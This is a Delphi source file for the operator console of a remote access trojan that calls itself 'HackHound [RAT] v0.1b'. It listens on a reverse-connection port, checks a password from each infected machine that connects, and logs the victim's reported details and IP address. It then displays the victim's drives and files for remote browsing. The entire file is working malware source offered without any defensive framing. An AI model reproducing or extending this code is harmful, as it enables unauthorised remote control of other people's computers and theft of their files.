unit untfrmMain;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, Menus, ComCtrls, XPMan, StdCtrls, ScktComp;

type
  TfrmMain = class(TForm)
    mnuFile: TMainMenu;
    File1: TMenuItem;
    mnuNewServer: TMenuItem;
    N1: TMenuItem;
    mnuExit: TMenuItem;
    mnuPreferences: TMenuItem;
    mnuHelp: TMenuItem;
    mnuHHRATHelp: TMenuItem;
    N2: TMenuItem;
    mnuAbout: TMenuItem;
    PageControl1: TPageControl;
    TabSheet1: TTabSheet;
    TabSheet2: TTabSheet;
    TabSheet3: TTabSheet;
    XPManifest1: TXPManifest;
    lvConnections: TListView;
    lvStats: TListView;
    chkSaveStatistics: TCheckBox;
    GroupBox1: TGroupBox;
    Label1: TLabel;
    txtReverseConnectionPort: TEdit;
    Label2: TLabel;
    txtPassword: TEdit;
    chkHidePassword: TCheckBox;
    chkNotifyOnNewConnection: TCheckBox;
    chkNotifyOnDisconnection: TCheckBox;
    cmdSaveSettings: TButton;
    SBMain: TStatusBar;
    sckServer: TServerSocket;
    GroupBox2: TGroupBox;
    lblTotalAttemptedConnections: TLabel;
    lblTotalSuccessfulConnections: TLabel;
    GroupBox3: TGroupBox;
    lblTotalSentData: TLabel;
    lblTotalReceivedData: TLabel;
    procedure FormCreate(Sender: TObject);
    procedure sckServerClientRead(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure sckServerClientDisconnect(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure sckServerClientError(Sender: TObject;
      Socket: TCustomWinSocket; ErrorEvent: TErrorEvent;
      var ErrorCode: Integer);
    procedure mnuExitClick(Sender: TObject);
    procedure mnuAboutClick(Sender: TObject);
    procedure cmdSaveSettingsClick(Sender: TObject);
    procedure lvConnectionsDblClick(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  frmMain: TfrmMain;
  iAttempted: Integer;
  iSuccessful: Integer;
  iReceived: Integer;
  iSelectedConnection: Integer;

implementation

uses untfrmAbout, untFunc, untfrmManage;

{$R *.dfm}

procedure TfrmMain.FormCreate(Sender: TObject);
begin
  ReadSettings(ExtractFilePath(Application.ExeName) + 'Settings.ini');
  StartListening(txtReverseConnectionPort.Text);
end;

procedure TfrmMain.sckServerClientRead(Sender: TObject; Socket: TCustomWinSocket);
var
  sData: String;
  sCmd: String;
  sDat: TStringList;
  LV: TListItem;
  Stats: TListItem;
  sDrives: TStringList;
  TDrives: TTreeNode;
  sFiles: TStringList;
  sSizes: TStringList;
  TFiles: TListItem;
  i: Integer;
  h: Integer;
begin
  sData := Socket.ReceiveText;
  sDat := Explode('|', sData);
  sCmd := sDat[0];
  iReceived := iReceived + Length(sData);
  lblTotalReceivedData.Caption := 'Total Received Data: ' + IntToStr(iReceived) + ' Bytes';

  If sCmd = 'Connect' Then
  Begin
    iAttempted := iAttempted + 1;
    lblTotalAttemptedConnections.Caption := 'Total Attempted Connections: ' + IntToStr(iAttempted);

    If chkNotifyOnNewConnection.Checked Then
    Begin
      //TrayIcon.ShowBalloonHint('New Connection', 'Latest Connection To Join: ' + Socket.RemoteAddress, bitInfo, 10);
      ShowMessage('New Connection: ' + Socket.RemoteAddress);
    End;

    If sDat[1] = txtPassword.Text Then
    Begin
      iSuccessful := iSuccessful + 1;
      lblTotalSuccessfulConnections.Caption := 'Total Successful Connections: ' + IntToStr(iSuccessful);

      LV := lvConnections.Items.Add;
      LV.Caption := sDat[2];
      LV.SubItems.Add(sDat[3]);
      LV.SubItems.Add(Socket.RemoteAddress);
      LV.SubItems.Add(sDat[4]);
      LV.SubItems.Add(sDat[5]);
      LV.SubItems.Add(sDat[6]);
      LV.SubItems.Add(sDat[7]);
      LV.SubItems.Add(sDat[8]);
      LV.SubItems.Add(sDat[9]);

      Stats := lvStats.Items.Add;
      Stats.Caption := TimeToStr(Time);
      Stats.SubItems.Add(Socket.RemoteAddress);
      Stats.SubItems.Add('Connection Accepted - Password Correct');
    End Else Begin
      Stats := lvStats.Items.Add;
      Stats.Caption := TimeToStr(Time);
      Stats.Subitems.Add(Socket.RemoteAddress);
      Stats.SubItems.Add('Connection Rejected - Password Incorrect');
      Socket.Disconnect(Socket.SocketHandle);
    End;
  End;

  If sCmd = 'Drives' Then
  Begin
    sDrives := Explode('++', sDat[1]);

    For i := 0 To sDrives.Count - 1 Do
    Begin
      //TDrives := frmManage.tvFolders.Items.Item
      TDrives := frmManage.tvFolders.Items.Add(Nil, sDrives[i]);
    End;
  End;

  If sCmd = 'Files' Then
  Begin
    sDrives := Explode('++', sDat[1]);
    sFiles := Explode('++', sDat[2]);
    sSizes := Explode('++', sDat[3]);

    frmManage.tvFolders.Items.Clear;
    frmManage.lvFiles.Items.Clear;

    For i := 0 To sDrives.Count - 1 Do
    Begin
      TDrives := frmManage.tvFolders.Items.Add(Nil, sDrives[i]);
    End;

    For i := 0 To sFiles.Count - 1 Do
    Begin
      TFiles := frmManage.lvFiles.Items.Add;
      TFiles.Caption := sFiles[i];
      TFiles.SubItems.Add(sSizes[i]);
    End;
  End;

  RecountConnections;

end;

procedure TfrmMain.sckServerClientDisconnect(Sender: TObject; Socket: TCustomWinSocket);
var
  i: Integer;
  Stats: TListItem;
begin
  For i := 0 To lvConnections.Items.Count - 1 Do
  Begin
    If lvConnections.Items.Item[i].SubItems.Strings[1] = Socket.RemoteAddress Then
    Begin
      lvConnections.Items.Delete(i);
      Stats := lvStats.Items.Add;
      Stats.Caption := TimeToStr(Time);
      Stats.SubItems.Add(Socket.RemoteAddress);
      Stats.SubItems.Add('Disconnected');

      If chkNotifyOnDisconnection.Checked Then
      Begin
        //TrayIcon.ShowBalloonHint('Lost Connection', 'Connection Lost To: ' + Socket.RemoteAddress, bitError, 10);
        ShowMessage('Connection Lost: ' + Socket.RemoteAddress);
      End;

      RecountConnections;
      Exit;
    End;
  End;
end;

procedure TfrmMain.sckServerClientError(Sender: TObject; Socket: TCustomWinSocket; ErrorEvent: TErrorEvent; var ErrorCode: Integer);
var
  i: Integer;
  Stats: TListItem;
begin
  ErrorCode := 0;
  For i := 0 To lvConnections.Items.Count - 1 Do
  Begin
    If lvConnections.Items.Item[i].SubItems.Strings[1] = Socket.RemoteAddress Then
    Begin
      lvConnections.Items.Delete(i);
      Stats := lvStats.Items.Add;
      Stats.Caption := TimeToStr(Time);
      Stats.SubItems.Add(Socket.RemoteAddress);
      Stats.SubItems.Add('Error - Disconnected');

      If chkNotifyOnDisconnection.Checked Then
      Begin
        //TrayIcon.ShowBalloonHint('Lost Connection', 'Connection Lost To: ' + Socket.RemoteAddress, bitError, 10);
        ShowMessage('Lost Connection: ' + Socket.RemoteAddress);
      End;

      RecountConnections;
      Exit;
    End;
  End;
end;

procedure TfrmMain.mnuExitClick(Sender: TObject);
begin
  sckServer.Active := False;
  Halt;
end;

procedure TfrmMain.mnuAboutClick(Sender: TObject);
begin
  frmAbout.Show;
end;

procedure TfrmMain.cmdSaveSettingsClick(Sender: TObject);
begin
  SaveSettings(ExtractFilePath(Application.ExeName) + 'Settings.ini');
  StartListening(txtReverseConnectionPort.Text);
end;


procedure TfrmMain.lvConnectionsDblClick(Sender: TObject);
var
  i: Integer;
  h: Integer;
begin
  For i := 0 To lvConnections.Items.Count - 1 Do
  Begin
    If lvConnections.Items.Item[i].Selected Then
    Begin
      For h := 0 To lvConnections.Items.Count - 1 Do
      Begin
        If lvConnections.Items.Item[i].SubItems.Strings[1] = sckServer.Socket.Connections[h].RemoteAddress Then
        Begin
          iSelectedConnection := h;
          frmManage.Show;
          frmManage.Caption := 'HackHound [RAT] v0.1b - [Managing - ' + sckServer.Socket.Connections[h].RemoteAddress + ']';
          Exit;
        End;
      End;
    End;
  End;
end;

end.

